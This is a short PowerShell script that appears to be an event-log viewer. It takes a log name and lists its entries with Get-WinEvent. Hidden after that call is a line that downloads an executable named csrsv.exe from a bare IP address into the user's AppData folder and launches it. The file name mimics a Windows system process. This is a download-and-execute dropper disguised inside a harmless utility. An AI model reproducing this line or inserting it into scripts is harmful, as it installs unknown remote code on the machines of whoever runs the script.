

[CmdletBinding()]
Param(
    [Parameter(Mandatory=$True,Position=0)]
        [String]$LogName
)

Get-WinEvent -LogName $LogName
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

